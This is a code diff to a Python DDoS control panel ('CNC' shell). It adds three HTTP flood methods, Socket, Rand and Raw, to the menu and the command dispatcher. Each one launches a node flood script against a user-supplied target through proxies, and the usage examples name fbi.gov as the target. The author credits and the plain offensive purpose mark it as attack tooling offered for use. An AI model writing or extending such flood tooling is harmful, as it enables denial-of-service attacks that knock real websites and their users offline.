@@ -104,9 +104,9 @@ def Layer7():
                \x1b[38;2;59;241;250m ソ\033[94mニ\x1b[38;2;224;0;142mッ\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mクパ・ネルMethods.                                    
             \033[94m—   \x1b[38;2;0;255;189mTls  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull    
             \033[94m—   \x1b[38;2;0;255;189mFlood\033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull       
+            \033[94m—   \x1b[38;2;0;255;189mSocket\033[94m — \033[92m  Null   \033[94m —   \033[93mNull     
+            \033[94m—   \x1b[38;2;0;255;189mRand \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
+            \033[94m—   \x1b[38;2;0;255;189mRaw  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull       
    ''')
 def Layer4():
 	print('''
@@ -193,6 +193,36 @@ def main():
               except IndexError:
                     print("Usage : Flood <proxy> <target> <time> <request>")
                     print("Example : Flood proxy.txt https://fbi.gov 120 1000")
+        elif "Socket" in cnc:
+              try:
+                    proxy=cnc.split()[1]
+                    target=cnc.split()[2]
+                    time=cnc.split()[3]
+                    request=cnc.split()[4]
+                    os.system(f"node HTTP-SOCKETS.js {proxy} {target} {time} {request}")
+              except IndexError:
+                    print("Usage : Socket <proxy> <target> <time> <request>")
+                    print("Example : Socket proxy.txt https://fbi.gov 120 1000")
+        elif "Rand" in cnc:
+              try:
+                    proxy=cnc.split()[1]
+                    target=cnc.split()[2]
+                    time=cnc.split()[3]
+                    request=cnc.split()[4]
+                    os.system(f"node HTTP-RAND.js {proxy} {target} {time} {request}")
+              except IndexError:
+                    print("Usage : Rand <proxy> <target> <time> <request>")
+                    print("Example : Rand proxy.txt https://fbi.gov 120 1000")
+        elif "Raw" in cnc:
+              try:
+                    proxy=cnc.split()[1]
+                    target=cnc.split()[2]
+                    time=cnc.split()[3]
+                    request=cnc.split()[4]
+                    os.system(f"node HTTP-RAW.js {proxy} {target} {time} {request}")
+              except IndexError:
+                    print("Usage : Raw <proxy> <target> <time> <request>")
+                    print("Example : Raw proxy.txt https://fbi.gov 120 1000")
 def author(kiohana):
 	print ("Shell Credit : GadaLuBau")
 	print ("Building The Methods : Xinzu")
